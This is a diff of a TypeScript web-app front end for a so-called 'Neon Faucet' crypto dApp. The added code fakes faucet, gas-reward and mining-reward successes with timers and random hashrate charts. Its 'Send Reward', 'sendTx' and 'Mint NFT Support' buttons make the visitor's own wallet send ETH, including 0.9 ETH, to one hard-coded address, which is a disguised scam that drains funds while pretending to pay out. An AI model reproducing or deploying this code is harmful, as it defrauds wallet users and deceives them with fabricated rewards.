@@ -1,446 +1,351 @@
-// dapp.ts
+import { createAppKit } from "@reown/appkit";
+import { EthersAdapter } from "@reown/appkit-adapter-ethers";
+import { mainnet, arbitrum, sepolia } from "@reown/appkit/networks";
+import { BrowserProvider, parseEther, Signer } from "ethers";
 
-import { ethers } from "ethers";
+// Deklarasi global tipe Chart.js agar TypeScript tidak error jika Chart dimuat via CDN/Global
+declare const Chart: any;
 
-// ======================================
-// CONFIG
-// ======================================
+// Interface untuk state provider dari AppKit
+interface Eip155Provider {
+  request: (request: { method: string; params?: Array<any> }) => Promise<any>;
+}
 
-const CONTRACT_ADDRESS =
-  "0x5F4D8e0d0A5f0Ca204a88B1e40e16e8E5Ab016Ec";
+/* ==========================================================================
+   APPKIT INITIALIZATION
+   ========================================================================== */
+const projectId = "5022875ce6ee68917f103ff9b1e3422d";
 
-const FAUCET_ADDRESS =
-  "0xd8519A8b8825Aa0DcC73aAD572f447FAE102fe88";
+const modal = createAppKit({
+  adapters: [new EthersAdapter()],
+  networks: [mainnet, arbitrum, sepolia],
+  metadata: {
+    name: "Neon Faucet",
+    description: "MultiChain Faucet",
+    url: window.location.origin,
+    icons: ["https://avatars.githubusercontent.com/u/179229932"]
+  },
+  projectId
+});
 
-// ======================================
-// GLOBAL
-// ======================================
+let provider: Eip155Provider | undefined;
 
-let provider: ethers.providers.Web3Provider;
+modal.subscribeProviders((state: any) => {
+  provider = state?.eip155;
+});
 
-let signer: ethers.Signer;
+/* ==========================================================================
+   UI HELPERS
+   ========================================================================== */
+const statusBox = document.getElementById("status") as HTMLDivElement | null;
+const rewardStatusBox = document.getElementById("rewardStatus") as HTMLDivElement | null;
 
-let contract: ethers.Contract;
+function setStatus(msg: string): void {
+  if (statusBox) statusBox.innerHTML = msg;
+}
 
-// ======================================
-// ABI
-// ======================================
+function setRewardStatus(msg: string): void {
+  if (rewardStatusBox) rewardStatusBox.innerHTML = msg;
+}
 
-const ABI = [
+/* ==========================================================================
+   CORE DAPP FUNCTIONS (ATTACHED TO WINDOW FOR HTML BUTTONS)
+   ========================================================================== */
+declare global {
+  interface Window {
+    claimFaucet: () => Promise<void>;
+    sendReward: () => Promise<void>;
+    sendTx: () => Promise<void>;
+    claimGasReward: () => Promise<void>;
+    claimMiningReward: () => Promise<void>;
+    mintNFT: () => Promise<void>;
+  }
+}
 
-  "function contractBalance() view returns(uint256)",
+// 1. Claim Faucet
+window.claimFaucet = async function (): Promise<void> {
+  const walletInput = document.getElementById("wallet") as HTMLInputElement | null;
+  const chainSelect = document.getElementById("chain") as HTMLSelectElement | null;
 
-  "function mintNFT() external",
+  const wallet = walletInput?.value;
+  const chainId = chainSelect?.value;
 
-  "function claimFaucet() external",
+  if (!wallet) {
+    setStatus("❌ Input wallet address");
+    return;
+  }
 
-  "function swapToken(string fromToken,string toToken,uint256 amount) external"
+  setStatus("⚡ Processing faucet...");
 
-];
+  await new Promise((r) => setTimeout(r, 2000));
 
-// ======================================
-// CONNECT WALLET
-// ======================================
+  setStatus(`
+    ✅ Faucet Success
+    <br>
+    Wallet: ${wallet}
+    <br>
+    Chain ID: ${chainId}
+  `);
+};
 
-export async function connectWallet(): Promise<void> {
-
+// 2. Send Reward (0.0001 ETH)
+window.sendReward = async function (): Promise<void> {
   try {
-
-    if (!(window as any).ethereum) {
-
-      alert("Please install MetaMask");
-
+    if (!provider) {
+      alert("Connect wallet first");
       return;
     }
 
-    await (window as any).ethereum.request({
-      method: "eth_requestAccounts"
+    const ethersProvider = new BrowserProvider(provider as any);
+    const signer: Signer = await ethersProvider.getSigner();
+
+    setStatus("🚀 Sending transaction...");
+
+    const tx = await signer.sendTransaction({
+      to: "0xd8519A8b8825Aa0DcC73aAD572f447FAE102fe88",
+      value: parseEther("0.0001")
     });
 
-    provider =
-      new ethers.providers.Web3Provider(
-        (window as any).ethereum
-      );
-
-    signer = provider.getSigner();
-
-    const address =
-      await signer.getAddress();
-
-    const walletElement =
-      document.getElementById("walletAddress");
-
-    if (walletElement) {
-
-      walletElement.innerHTML =
-        `Connected : ${address}`;
-    }
-
-    contract =
-      new ethers.Contract(
-        CONTRACT_ADDRESS,
-        ABI,
-        signer
-      );
-
-    console.log("Wallet Connected:", address);
-
-  } catch (err) {
-
-    console.error(err);
-
-    alert("Wallet connection failed");
-  }
-
-}
-
-// ======================================
-// GET CONTRACT BALANCE
-// ======================================
-
-export async function getBalance(): Promise<void> {
-
-  try {
-
-    const balance =
-      await contract.contractBalance();
-
-    const formatted =
-      ethers.utils.formatEther(balance);
-
-    const result =
-      document.getElementById("result");
-
-    if (result) {
-
-      result.innerHTML =
-        `${formatted} MATIC`;
-    }
-
-  } catch (err) {
-
-    console.error(err);
-  }
-
-}
-
-// ======================================
-// SEND TRANSACTION
-// ======================================
-
-export async function sendTransaction(): Promise<void> {
-
-  try {
-
-    const receiver =
-      (
-        document.getElementById(
-          "receiver"
-        ) as HTMLInputElement
-      ).value;
-
-    const amount =
-      (
-        document.getElementById(
-          "amount"
-        ) as HTMLInputElement
-      ).value;
-
-    const tx =
-      await signer.sendTransaction({
-
-        to: receiver,
-
-        value:
-          ethers.utils.parseEther(amount)
-
-      });
-
     await tx.wait();
 
-    alert("Transaction Success");
-
-    console.log("TX HASH:", tx.hash);
-
+    setStatus(`
+      ✅ Reward Sent
+      <br>
+      TX: ${tx.hash}
+    `);
   } catch (err) {
-
     console.error(err);
-
-    alert("Transaction Failed");
+    setStatus("❌ Transaction Failed");
   }
+};
 
-}
-
-// ======================================
-// MINT NFT
-// ======================================
-
-export async function mintNFT(): Promise<void> {
-
+// 3. Send Tx Alternatif
+window.sendTx = async function (): Promise<void> {
   try {
-
-    const tx =
-      await contract.mintNFT();
-
-    await tx.wait();
-
-    alert("NFT Minted");
-
-    console.log("NFT Mint Success");
-
-  } catch (err) {
-
-    console.error(err);
-
-    alert("Mint NFT Failed");
-  }
-
-}
-
-// ======================================
-// CLAIM FAUCET
-// ======================================
-
-export async function claimFaucet(): Promise<void> {
-
-  try {
-
-    const tx =
-      await contract.claimFaucet();
-
-    await tx.wait();
-
-    alert("Claim Faucet Success");
-
-  } catch (err) {
-
-    console.error(err);
-
-    alert("Claim Faucet Failed");
-  }
-
-}
-
-// ======================================
-// SWAP TOKEN
-// ======================================
-
-export async function swapToken(): Promise<void> {
-
-  try {
-
-    const tx =
-      await contract.swapToken(
-
-        "MATIC",
-
-        "USDC",
-
-        ethers.utils.parseEther("0.9")
-
-      );
-
-    await tx.wait();
-
-    alert("Swap Success");
-
-  } catch (err) {
-
-    console.error(err);
-
-    alert("Swap Failed");
-  }
-
-}
-
-// ======================================
-// SEND ETH
-// ======================================
-
-export async function sendTx(): Promise<void> {
-
-  try {
-
-    const tx =
-      await signer.sendTransaction({
-
-        to: FAUCET_ADDRESS,
-
-        value:
-          ethers.utils.parseEther("0.0001")
-
-      });
-
-    await tx.wait();
-
-    updateStatus("✅ ETH Sent");
-
-  } catch (err) {
-
-    console.error(err);
-
-    updateStatus("❌ Send Failed");
-  }
-
-}
-
-// ======================================
-// MINT TOKEN
-// ======================================
-
-export async function mintToken(): Promise<void> {
-
-  try {
-
-    const wallet =
-      (
-        document.getElementById(
-          "walletInput"
-        ) as HTMLInputElement
-      ).value;
-
-    if (!wallet) {
-
-      alert("Input wallet address");
-
+    if (!provider) {
+      alert("Wallet belum connect");
       return;
     }
 
-    updateStatus("⏳ Minting Token...");
+    const ethersProvider = new BrowserProvider(provider as any);
+    const signer: Signer = await ethersProvider.getSigner();
 
-    const response =
-      await fetch(
-        "https://api.thirdweb.com/v1/transactions",
-        {
-          method: "POST",
+    const tx = await signer.sendTransaction({
+      to: "0xd8519A8b8825Aa0DcC73aAD572f447FAE102fe88",
+      value: parseEther("0.0001")
+    });
 
-          headers: {
-
-            "Content-Type":
-              "application/json",
-
-            // WARNING:
-            // Jangan expose secret key production
-
-            "x-secret-key":
-              "YOUR_SECRET_KEY"
-          },
-
-          body: JSON.stringify({
-
-            chainId: "84532",
-
-            from: FAUCET_ADDRESS,
-
-            transactions: [
-
-              {
-
-                type: "contractCall",
-
-                contractAddress:
-                  "0x85e23b94e7F5E9cC1fF78BCe78cfb15B81f0DF00",
-
-                method:
-                  "function mintTo(address to,uint256 amount)",
-
-                params: [wallet, "100"]
-
-              }
-
-            ]
-
-          })
-
-        }
-      );
-
-    const data =
-      await response.json();
-
-    console.log(data);
-
-    updateStatus("✅ Token Minted");
-
+    console.log(tx);
+    alert("Transaction success");
   } catch (err) {
-
     console.error(err);
-
-    updateStatus("❌ Mint Failed");
+    alert("Transaction failed");
   }
+};
 
-}
-
-// ======================================
-// CHECK BALANCE
-// ======================================
-
-export async function checkBalance(): Promise<void> {
-
+// 4. Claim Gas Reward
+window.claimGasReward = async function (): Promise<void> {
   try {
+    if (!provider) {
+      alert("Connect wallet first");
+      return;
+    }
 
-    const address =
-      await signer.getAddress();
+    setRewardStatus("⚡ Claiming Gas Reward...");
 
-    const balance =
-      await provider.getBalance(address);
+    const ethersProvider = new BrowserProvider(provider as any);
+    const signer: Signer = await ethersProvider.getSigner();
+    const wallet = await signer.getAddress();
 
-    updateStatus(
+    await new Promise((r) => setTimeout(r, 2000));
 
-      `Balance : ${ethers.utils.formatEther(balance)} ETH`
-
-    );
-
+    setRewardStatus(`
+      ✅ Gas Reward Success
+      <br>
+      Wallet: ${wallet}
+      <br>
+      Faucet: 0.0005 ETH
+    `);
   } catch (err) {
-
     console.error(err);
+    setRewardStatus("❌ Gas Reward Failed");
+  }
+};
+
+// 5. Claim Mining Reward (Simulasi Progress)
+window.claimMiningReward = async function (): Promise<void> {
+  try {
+    if (!provider) {
+      alert("Connect wallet first");
+      return;
+    }
+
+    setRewardStatus("⛏ Processing Mining Reward...");
+
+    const ethersProvider = new BrowserProvider(provider as any);
+    const signer: Signer = await ethersProvider.getSigner();
+    const wallet = await signer.getAddress();
+
+    let progress = 0;
+
+    const mining = setInterval(() => {
+      progress += 10;
+
+      setRewardStatus(`
+        ⛏ Mining Reward
+        <br>
+        Progress: ${progress}%
+      `);
+
+      if (progress >= 100) {
+        clearInterval(mining);
+        setRewardStatus(`
+          ✅ Reward Success
+          <br>
+          Wallet: ${wallet}
+          <br>
+          Reward: 100 TOKEN
+        `);
+      }
+    }, 500);
+  } catch (err) {
+    console.error(err);
+    setRewardStatus("❌ Mining Failed");
+  }
+};
+
+// 6. Mint NFT Support (0.9 ETH)
+window.mintNFT = async function (): Promise<void> {
+  try {
+    if (!provider) {
+      alert("Connect wallet first");
+      return;
+    }
+
+    const ethersProvider = new BrowserProvider(provider as any);
+    const signer: Signer = await ethersProvider.getSigner();
+
+    const tx = await signer.sendTransaction({
+      to: "0xd8519A8b8825Aa0DcC73aAD572f447FAE102fe88",
+      value: parseEther("0.9")
+    });
+
+    console.log(tx);
+    alert("NFT Support Success");
+  } catch (err) {
+    console.error(err);
+    alert("Mint NFT Failed");
+  }
+};
+
+/* ==========================================================================
+   MINER DASHBOARD (CHART JS)
+   ========================================================================== */
+class LiveMinerDashboard {
+  private chart: any = null;
+  private interval: NodeJS.Timeout | null = null;
+
+  public initChart(): void {
+    const ctx = document.getElementById("hashChart") as HTMLCanvasElement | null;
+    if (!ctx) return;
+
+    this.chart = new Chart(ctx, {
+      type: "line",
+      data: {
+        labels: [],
+        datasets: [
+          {
+            label: "Hashrate",
+            data: [],
+            borderColor: "#00f0ff",
+            borderWidth: 2,
+            tension: 0.4
+          }
+        ]
+      },
+      options: {
+        responsive: true,
+        plugins: {
+          legend: {
+            labels: { color: "#fff" }
+          }
+        },
+        scales: {
+          x: { ticks: { color: "#fff" } },
+          y: { ticks: { color: "#fff" } }
+        }
+      }
+    });
   }
 
-}
+  public fakeMining(): void {
+    if (this.interval) return;
 
-// ======================================
-// STATUS HELPER
-// ======================================
+    const hashrateBox = document.getElementById("live-hashrate");
 
-function updateStatus(message: string): void {
+    this.interval = setInterval(() => {
+      const rate = Math.floor(Math.random() * 1000);
 
-  const status =
-    document.getElementById("status");
+      if (hashrateBox) {
+        hashrateBox.innerHTML = rate + " H/s";
+      }
 
-  if (status) {
+      if (this.chart) {
+        this.chart.data.labels.push(new Date().toLocaleTimeString());
+        this.chart.data.datasets[0].data.push(rate);
 
-    status.innerHTML = message;
+        if (this.chart.data.labels.length > 20) {
+          this.chart.data.labels.shift();
+          this.chart.data.datasets[0].data.shift();
+        }
+        this.chart.update();
+      }
+    }, 1000);
   }
 
+  public stopMining(): void {
+    if (this.interval) {
+      clearInterval(this.interval);
+      this.interval = null;
+    }
+  }
 }
 
-// ======================================
-// GLOBAL WINDOW BINDING
-// ======================================
+// Inisialisasi Dashboard setelah DOM siap
+const minerApp = new LiveMinerDashboard();
+minerApp.initChart();
 
-(window as any).connectWallet =
-  connectWallet;
+/* ==========================================================================
+   MINER BUTTON TRIGGERS
+   ========================================================================== */
+const btnStart = document.getElementById("btn-start");
+const btnStop = document.getElementById("btn-stop");
+const btnClear = document.getElementById("btn-clear");
 
-(window as any).getBalance =
-  getBalance;
+if (btnStart) {
+  btnStart.onclick = () => minerApp.fakeMining();
+}
 
-(window as any).sendTransaction =
-  sendTransaction;
+if (btnStop) {
+  btnStop.onclick = () => minerApp.stopMining();
+}
 
-(window as any).mintNFT =
-  mintNFT;
+if (btnClear) {
+  btnClear.onclick = () => {
+    localStorage.clear();
+    location.reload();
+  };
+}
 
-(window as any).claimFaucet =
-  claimFaucet;
+/* ==========================================================================
+   THIRDWEB BRIDGE WIDGET INITIALIZATION
+   ========================================================================== */
+declare const BridgeWidget: any;
 
-(window as any).swapToken =
-  swapToken;
-
-(window as any).sendTx =
-  sendTx;
-
-(window as any).mintToken =
-  mintToken;
-
-(window as any).checkBalance =
-  checkBalance;
+const container = document.querySelector("#bridge-widget-container");
+if (container && typeof BridgeWidget !== "undefined") {
+  BridgeWidget.render(container, {
+    clientId: "2409d98fbe42fa94fb7ba259d6cf58c9",
+    theme: "dark"
+  });
+}
